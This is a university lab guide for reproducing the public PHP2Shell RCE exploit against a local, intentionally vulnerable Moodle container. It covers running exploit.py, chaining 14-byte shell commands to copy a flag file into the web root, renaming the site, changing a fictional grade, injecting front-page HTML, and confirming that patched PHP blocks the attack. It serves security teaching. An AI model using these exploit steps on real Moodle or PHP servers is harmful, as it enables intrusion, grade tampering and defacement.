# Student Lab Guide: Hacking Moodle by PHP2Shell

In this Lab, you will reproduce PHP2Shell against a local Moodle instance, collect remote code execution (RCE) evidence, retrieve the Flag, modify fictional Moodle data, and verify the PHP security patch.

Follow the Labs in order. Run all commands from the project root unless stated otherwise.

## Safety and scope

Only use the intentionally vulnerable Lab environment on your own computer.

- Do not attack external websites, school systems, or other students' machines.
- Keep the Lab on `127.0.0.1`; do not expose it to the Internet.
- Do not modify the vendored exploit in `php2shell/`.
- Settings such as `seccomp=unconfined`, `setarch -R`, and writable shared directories are for this Lab only.
- All Moodle data is fictional. Reset your changes afterward.

## How the Lab works

The vulnerability is in **PHP request startup**, not Moodle itself. To reproduce the public Proof of Concept (PoC), the Lab uses:

| Component | Configuration |
|---|---|
| PHP | 8.3.35 (vulnerable) |
| Target | Moodle `/index.php` |
| Request startup | `8M / 1000 / display_errors=On` |
| Moodle runtime | `config.php` raises the memory limit to `256M` |
| Other Moodle pages | `256M / 5000 / display_errors=Off` |
| Apache | One prefork worker |
| Address layout | `setarch -R` |

Moodle needs more memory than the PoC's startup configuration allows. The container therefore raises the memory limit after request startup, before Moodle loads. `setarch -R` reduces address randomization for reproducibility; it does not demonstrate an ASLR bypass.

In the tested environment, the PoC executed commands as `www-data`, retrieved the Flag, and modified fictional Moodle data. After updating PHP to 8.3.36, the PoC failed at stage 1 while Moodle remained functional.

These results apply to this controlled configuration, not necessarily a production Moodle deployment. Testing was performed on macOS Apple Silicon with amd64 emulation; Windows WSL2, Linux x86-64, and native ARM execution were not verified in the same run.

---

## 0. Before you start

### Check the prerequisites

```sh
sh scripts/prelab-check.sh
```

Expected:

```text
Result: all checks passed.
```

Follow any `[FAIL]` hints or consult [README Troubleshooting](../../README.md#troubleshooting).

### Check the working directory

```sh
pwd
ls

test -f .env || cp .env.example .env
grep '^MOODLE_PORT=' .env
```

The project root should contain `compose.yaml`, `compose.vuln.yaml`, `php2shell/`, `loot/`, and `labs/`.

The default Moodle port is `8080`. If you changed it, adjust the HTTP commands accordingly.

Keep running commands from the project root: paths such as `loot/p1` are relative to your current directory.

---

## 1. Lab 1: Start and configure Moodle

### 1.1 Start Moodle

On a local computer:

```sh
docker compose -f compose.yaml -f compose.vuln.yaml up -d
```

On GitHub Codespaces:

```sh
sh scripts/codespace-up.sh
```

The Codespaces helper configures the forwarded HTTPS URL automatically. Other reverse proxies require setting `MOODLE_WWWROOT` manually.

Wait for initialization:

```sh
sh scripts/wait-moodle.sh

docker compose -f compose.yaml -f compose.vuln.yaml ps

curl -s -o /dev/null -w '%{http_code}\n' \
  http://127.0.0.1:8080/login/index.php
```

Expected: `Moodle is up`, a healthy database, and HTTP `200`.

Open `http://127.0.0.1:8080/login/index.php`. A temporary `302` or `500` during installation is normal; wait for initialization to finish.

**Lab accounts**

| Account | Credentials |
|---|---|
| Administrator | `admin` / `MOODLE_ADMIN_PASSWORD` in `.env` |
| Test student | `p2s_student` / `StudentOnly-2026` |

The default administrator password is `ClassroomOnly-ChangeMe-2026`. These accounts are for the local Lab only.

### 1.2 Configure PHP and Apache

First, run:

```sh
sh scripts/env-check.sh
```

The public PoC requires specific PHP settings, as documented in its
[Target configuration](https://github.com/3em0/php2shell#target-configuration)
and [Limitations](https://github.com/3em0/php2shell#limitations).

`labs/vuln/php.ini` and `labs/vuln/apache.conf` are generated from the tracked `*.template` files on first start and are Git-ignored. Edit them normally; do not commit them.

Edit `labs/vuln/php.ini`:

```ini
display_errors = On
display_startup_errors = On
memory_limit = 8M
max_input_vars = 1000
```

Keep the existing session and upload settings.

Then edit `labs/vuln/apache.conf`:

```apache
KeepAlive Off

<IfModule mpm_prefork_module>
    StartServers           1
    MinSpareServers        1
    MaxSpareServers        1
    MaxRequestWorkers      1
    ServerLimit            1
    MaxConnectionsPerChild 0
</IfModule>

<LocationMatch "^/(?!index\.php$).*\.php$">
    php_value memory_limit 256M
    php_value max_input_vars 5000
    php_value display_errors Off
    php_value display_startup_errors Off
</LocationMatch>
```

The PHP settings reproduce the PoC's request-startup conditions. A single Apache worker makes cross-request behavior easier to reproduce, while `LocationMatch` gives other Moodle pages higher limits.

The container automatically adjusts Moodle's `config.php` to raise the memory limit to `256M` after startup. You do not need to edit it.

Restart Moodle and check again:

```sh
docker compose -f compose.yaml -f compose.vuln.yaml \
  up -d --force-recreate moodle

sh scripts/wait-moodle.sh
sh scripts/env-check.sh
```

Expected:

```text
Result: PASS for container ... (PHP 8.3.35).
```

PASS means the checked environment settings are correct. It does not mean RCE has succeeded.

### 1.3 Verify the environment

```sh
curl -s -o /dev/null -w '%{http_code}\n' \
  http://127.0.0.1:8080/index.php

docker compose -f compose.yaml -f compose.vuln.yaml exec moodle \
  sh -c 'php -i | grep -E "memory_limit|max_input_vars|display_errors"'

docker compose -f compose.yaml -f compose.vuln.yaml exec moodle \
  sh -c 'grep -A4 LocationMatch /etc/apache2/conf-enabled/zz-vuln.conf'

docker compose -f compose.yaml -f compose.vuln.yaml exec moodle \
  sh -c 'head -4 /var/www/config/config.php'

docker compose -f compose.yaml -f compose.vuln.yaml exec moodle \
  sh -c 'grep MaxRequestWorkers /etc/apache2/conf-enabled/zz-vuln.conf'
```

Confirm HTTP `200`, PHP settings `8M / 1000 / On`, Apache overrides `256M / 5000 / Off`, and `MaxRequestWorkers 1`.

Note that `php -i` uses the PHP Command-Line Interface (CLI), so Apache's `php_value` overrides do not appear in its output.

Save the container ID:

```sh
export CONTAINER=$(docker compose -f compose.yaml -f compose.vuln.yaml ps -q moodle)
echo "$CONTAINER"
```

Confirm the version and architecture:

```sh
docker compose -f compose.yaml -f compose.vuln.yaml exec moodle php -v
docker compose -f compose.yaml -f compose.vuln.yaml exec moodle uname -m
```

Expected: PHP `8.3.35`, `x86_64`, and a nonempty container ID.

---

## 2. Lab 2: Read the PoC

Inspect the exploit before using it:

```sh
ls php2shell/
python3 php2shell/exploit.py --help
cat php2shell/VENDORED.md
```

The PoC is pinned to commit `e0c786b43f772c874a69c161e8141efab9885bfa` and uses the MIT license.

Focus on:

1. `PROFILES`: version-specific settings, including `official83`.
2. Stage functions: heap leak, `libphp` leak, and fake HashTable.
3. `-c`, `--proof-file`, and `--fetch`: command execution and evidence retrieval.

`--docker-container` uses the local container's `libphp.so` to calculate offsets. It is a Lab convenience, not a generic remote-only exploit.

The `-c` argument accepts at most **14 bytes**. Later Labs will use short commands to execute longer scripts.

---

## 3. Lab 3: Identify the execution user

Run `id` to see which account executes the command:

```sh
rm -f loot/p1

python3 php2shell/exploit.py \
  -u http://127.0.0.1:8080/index.php \
  --profile official83 \
  --docker-container "$CONTAINER" \
  --proof-file loot/p1 \
  -c 'id>/loot/p1'

cat loot/p1
```

Expected:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The command executed as the container's web-server user, `www-data`. This is not root access or Moodle administrator access.

---

## 4. Lab 4: Retrieve the Flag

### 4.1 Understand the 14-byte limit

The PoC's `-c` accepts at most **14 UTF-8 bytes**, but:

```sh
cat /opt/lab/flag.txt
```

is 21 bytes long.

We will use multiple short commands to build the following script inside the target:

```sh
cd /opt/lab
cat *>/var/www/html/p
```

It reads files from `/opt/lab` and writes the result to `/var/www/html/p`, where HTTP can retrieve it.

The commands use:

- `printf TEXT>x` to create a file.
- `printf TEXT>>x` to append text.
- `sh < x` to execute the completed script.
- `--fetch /x` to read the current script over HTTP.

The Apache worker's working directory is `/var/www/html`.

### 4.2 Build the script

Define a helper:

```sh
run_short() {
  python3 php2shell/exploit.py \
    -u http://127.0.0.1:8080/index.php \
    --profile official83 \
    --docker-container "$CONTAINER" \
    --proof-file '' \
    --fetch /x \
    -c "$1"
}
```

Remove previous files:

```sh
docker compose -f compose.yaml -f compose.vuln.yaml exec moodle \
  rm -f /var/www/html/x /var/www/html/p
```

Run the short commands in order:

```sh
run_short "printf 'cd '>x"
run_short 'printf /opt>>x'
run_short 'printf /lab>>x'
run_short "printf '\n'>>x"

run_short 'printf cat>>x'
run_short "printf ' *'>>x"
run_short "printf '>'>>x"
run_short 'printf /var>>x'
run_short 'printf /www>>x'
run_short 'printf /htm>>x'
run_short 'printf l>>x'
run_short 'printf /p>>x'
```

Each command fits the 14-byte limit. After each attempt, `--fetch /x` shows the current script.

Verify the result:

```sh
docker compose -f compose.yaml -f compose.vuln.yaml exec moodle \
  cat /var/www/html/x
```

Expected:

```sh
cd /opt/lab
cat *>/var/www/html/p
```

Since `/x` persists between requests, fetching it does not always prove that the latest attempt succeeded. Check that its contents progressed as expected.

### 4.3 Execute and retrieve the Flag

```sh
python3 php2shell/exploit.py \
  -u http://127.0.0.1:8080/index.php \
  --profile official83 \
  --docker-container "$CONTAINER" \
  --proof-file '' \
  --fetch /p \
  -c 'sh < x'

curl -s http://127.0.0.1:8080/p
```

Expected:

```text
PROOF: FLAG{...}
```

The HTTP request should return the same Flag.

The script was assembled through multiple RCE commands rather than copied from the Host.

### 4.4 Clean up

Save your evidence, then remove the temporary files:

```sh
docker compose -f compose.yaml -f compose.vuln.yaml exec moodle \
  rm -f /var/www/html/x /var/www/html/p

rm -f loot/p1
```

Using `docker compose exec` for cleanup is fine, but directly reading the Flag with it does not count as completing the RCE challenge.

---

## 5. Modify Moodle test data

Now that we have confirmed RCE as `www-data`, we will demonstrate three effects on fictional Moodle data.

For these Labs, prepared PHP scripts are copied into `loot/`, a directory shared with the container. This simplifies payload delivery; the PoC still triggers execution.

### Shared helper

Define this function once before Lab 6:

```sh
run_effect() {
  name="$1"
  shift

  cp "labs/examples/$name.php" "loot/$name.php"

  printf 'php /loot/%s.php' "$name" > loot/c
  for arg in "$@"; do
    printf ' %s' "$arg" >> loot/c
  done
  printf '\n' >> loot/c

  rm -f loot/p1

  python3 php2shell/exploit.py \
    -u http://127.0.0.1:8080/index.php \
    --profile official83 \
    --docker-container "$CONTAINER" \
    --proof-file loot/p1 \
    -c 'sh</loot/c'

  cat loot/p1
}
```

Each call copies the selected script, executes it through the PoC, and displays the proof. Define the function again if you open a new terminal.

## 6. Lab 6: Change the front-page name

Change the Moodle site name:

```sh
run_effect homepage
```

Expected:

```text
impact=ok before=NCKU Moodle after=PWNED by PHP2Shell db=verified file=present
```

Verify the change:

```sh
curl -s http://127.0.0.1:8080/impact.txt
curl -s http://127.0.0.1:8080/ | grep -o '<title>[^<]*</title>'
```

Expected: `front page renamed by www-data` and the title `首頁 | PWNED by PHP2Shell`.

Reset:

```sh
run_effect reset-homepage

curl -s -o /dev/null -w '%{http_code}\n' \
  http://127.0.0.1:8080/impact.txt
```

Expected:

```text
homepage-reset=ok fullname=NCKU Moodle shortname=NCKU Moodle impact=absent db=verified
404
```

The site name returns to `NCKU Moodle`, and `impact.txt` is removed. This reset does not affect the other two effects.

---

## 7. Lab 7: Change a fictional grade

The Lab contains an existing test grade:

| Field | Value |
|---|---|
| Course | `作業系統` (`OS`) |
| Grade item | `Midterm` |
| Student | `p2s_student` |
| Initial grade | `30.00` |

Change it to `100.00`:

```sh
rm -f loot/grade-progress.txt
run_effect grade 100
```

Expected:

```text
grade-state=complete grade=100.00 finalgrade=100.00 student=p2s_student course=OS courseid=... userid=... itemid=... db=verified
```

The script writes the final proof only after verifying the database value. If it fails, inspect:

```sh
cat loot/grade-progress.txt
```

You can also check the result through HTTP:

```sh
curl -s http://127.0.0.1:8080/grade-demo.txt
```

Or open Moodle's grader report as administrator:

```text
http://127.0.0.1:8080/grade/report/grader/index.php?id=<courseid>
```

Use the `courseid` from the proof.

Reset:

```sh
run_effect reset-grade

curl -s -o /dev/null -w '%{http_code}\n' \
  http://127.0.0.1:8080/grade-demo.txt
```

Expected:

```text
grade-reset=ok course=OS item=Midterm grade=30.00 seed_user=p2s_student grade_demo=absent db=verified
404
```

The grade returns to `30.00`. The course, grade item, and student remain intact.

---

## 8. Lab 8: Add a good-hacker image

This effect adds a clickable image near the top of Moodle's front page. Clicking it opens a YouTube video in a new tab; it does not redirect the entire site.

Run:

```sh
run_effect good-hacker
```

Expected:

```text
good-hacker=ok image=https://s.xn--kst.tw/good-hacker.webp link=youtube db=verified
```

Verify:

```sh
curl -s http://127.0.0.1:8080/ |
  grep -o 's.xn--kst.tw/good-hacker.webp\|youtube.com/watch?v=dQw4w9WgXcQ'
```

Open `http://127.0.0.1:8080/` to view the image and try the link.

The image is loaded externally, so displaying it requires network access.

Reset:

```sh
run_effect reset-good-hacker

curl -s http://127.0.0.1:8080/ |
  grep -o 'good-hacker.webp' || echo image-link-absent
```

Expected:

```text
good-hacker-reset=ok image=absent link=absent top=restored db=verified
image-link-absent
```

The reset restores the previous `additionalhtmltopofbody` content without changing the site name or grade. It can be run repeatedly.

---

## 9. Verify the baseline and save evidence

### 9.1 Expected baseline

| Item | Baseline |
|---|---|
| Site name | `NCKU Moodle` |
| Administrator | `admin` / password from `.env` |
| Test student | `p2s_student` / `StudentOnly-2026` |
| Course | `作業系統` (`OS`) |
| Grade | `Midterm = 30.00` |
| Good-hacker image | Absent |
| Public artifacts | No `impact.txt`, `grade-demo.txt`, or `/p` |
| Flag | `/opt/lab/flag.txt`, outside the Web Root |
| PHP | 8.3.35 (vulnerable), 8.3.36 (patched) |
| Apache | One prefork worker |

The initializer creates the baseline data, but restarting Moodle does not automatically undo the effects. Use the reset scripts to restore them.

### 9.2 Verify the resets

```sh
curl -s http://127.0.0.1:8080/ |
  grep -o '<title>[^<]*</title>'

curl -s -o /dev/null -w '%{http_code}\n' \
  http://127.0.0.1:8080/impact.txt

curl -s -o /dev/null -w '%{http_code}\n' \
  http://127.0.0.1:8080/grade-demo.txt

curl -s http://127.0.0.1:8080/ |
  grep -o 'good-hacker.webp' || echo image-link-absent
```

Expected: `NCKU Moodle`, two `404` responses, and `image-link-absent`.

Verify the grade directly if needed:

```sh
docker compose -f compose.yaml -f compose.vuln.yaml exec db \
  mariadb -umoodle -pLocalLabDatabaseOnly moodle \
  -e "SELECT c.shortname, gi.itemname, gg.finalgrade FROM mdl_course c JOIN mdl_grade_items gi ON gi.courseid=c.id JOIN mdl_grade_grades gg ON gg.itemid=gi.id WHERE c.shortname='OS' AND gi.itemname='Midterm';"
```

Expected: `OS`, `Midterm`, `30.00000`.

All three reset scripts can be repeated. If a reset reports `failed`, inspect the output before continuing.

### 9.3 Save your evidence

Your writeup should include:

1. PHP version, ini settings, worker count, and architecture.
2. Normal request time versus `sleep 5`.
3. `uid=33(www-data)` proof.
4. Flag retrieved through HTTP.
5. Before / after / reset for at least one Moodle effect.

Keep useful failure logs and troubleshooting notes as well.

### 9.4 Clean up

After saving your evidence and resetting the effects:

```sh
sh scripts/cleanup-artifacts.sh
```

This removes the Lab's fixed temporary files, including `/x`, `/p`, `impact.txt`, `grade-demo.txt`, and selected `loot/` artifacts. It does not restore Moodle database values.

---

## 10. Lab 8: Compare vulnerable and patched PHP

We will now update PHP from 8.3.35 to 8.3.36 and repeat the same PoC test.

### 10.1 Switch PHP versions

**Reset all three Moodle effects before patching**, because the vulnerable PoC may no longer execute their reset scripts afterward.

```sh
sh scripts/switch-php.sh 8.3.36
```

Expected:

```text
PHP_SWITCH=ok version=8.3.36 image=moodle-php-lab-moodle:8.3.36 container=<id>
export CONTAINER=<id>
```

The script recreates Moodle, verifies the version, and removes old proof files by default. Save your evidence first or use `--keep-evidence`.

If you forgot to reset, you can temporarily switch back:

```sh
sh scripts/switch-php.sh 8.3.35
# Reset the effects through the vulnerable PoC.
sh scripts/switch-php.sh 8.3.36
```

Alternatively, trusted reset scripts can run directly inside the container for cleanup. That does not count as RCE evidence.

### 10.2 Verify the version

```sh
sh scripts/env-check.sh 8.3.36

docker compose -f compose.yaml -f compose.vuln.yaml \
  -f compose.patched.yaml exec moodle php -v
```

Expected: PASS and `PHP 8.3.36`.

Use the new container ID from the switching script for the next test.

### 10.3 Repeat the PoC

```sh
rm -f loot/p1

time python3 php2shell/exploit.py \
  -u http://127.0.0.1:8080/index.php \
  --profile official83 \
  --docker-container "$CONTAINER" \
  --proof-file loot/p1 \
  -c 'id>/loot/p1'
```

In the tested patched environment, stage 1 reported `heap leak missed` and ended with:

```text
HEAP_LEAK_FAILED
```

There should be no new `loot/p1`.

If the result differs, first verify the PHP version, running image, and container ID.

### 10.4 Confirm Moodle still works

```sh
curl -s -o /dev/null -w '%{http_code}\n' \
  http://127.0.0.1:8080/login/index.php

curl -s http://127.0.0.1:8080/index.php |
  grep -o '<title>[^<]*</title>'
```

Expected: HTTP `200` and `首頁 | NCKU Moodle`.

Under the tested conditions, the patched version no longer produced RCE evidence while Moodle remained functional. This does not prove that the entire system is secure. Record the version, retries, and complete output.

---

## 11. After-class assignment: Fourth Moodle effect (10%)

Use the same PoC to create another effect on **fictional Moodle data**, different from the three in-class examples.

Possible ideas include changing the `作業系統` course summary, creating a test course named `P2S-FOURTH`, or editing a test announcement.

Submit the commands or scripts, before / after / reset evidence, and a brief explanation of how you verified the changes.

Do not modify real data, Moodle core, the database schema, the Flag, or the exploit.

See [`fourth-effect-template.md`](../examples/fourth-effect-template.md).

---

## 12. Writeup and grading

Use [`writeup-template.md`](writeup-template.md).

| Item | Weight |
|---|---:|
| Environment and version verification | 20% |
| PoC source and conditions | 20% |
| RCE, Flag, and impact evidence | 30% |
| Patched comparison | 20% |
| Fourth Moodle effect | 10% |

Bonuses:

- Deeper PoC mechanism analysis: +10%.
- Additional verified impact analysis: +10%.

Total grade is capped at 100%.

Report what you actually observed. Unsupported success claims receive no credit for the corresponding item; documented failures with meaningful analysis may receive partial credit.

---

## 13. Troubleshooting

For installation and platform issues, see [README Troubleshooting](../../README.md#troubleshooting).

| Symptom | What to check |
|---|---|
| `Connection refused` | Container status, port, and logs |
| Installation returns `302` or `500` | Wait for `wait-moodle.sh` |
| Repeated redirect to `install.php` | Initialization logs, permissions, and symlinks |
| `EXPLOIT_FAILED` with an existing proof | Remove stale proof; check working directory and path |
| Grade does not reach `grade-state=complete` | Inspect `loot/grade-progress.txt` |
| Site title remains `PWNED` after good-hacker reset | Run Homepage reset separately |
| Repeated `heap leak missed` | PHP version, ini settings, worker count, target URL |
| Cannot write to `/loot` | Mount permissions; restart if necessary |
| Database connection failure | Database container and persistent configuration |
| `require_once(.../lib/setup.php)` error | Entrypoint configuration path; rebuild if needed |
| Repeated `no proof yet` | Command output and proof path |
| Title unchanged after reset | Reset proof, cache, and page refresh |
| `Moodle baseline failed` | Startup logs and initialization errors |

If an operation fails three times, stop retrying blindly. Save the output, environment details, and troubleshooting steps for your writeup.
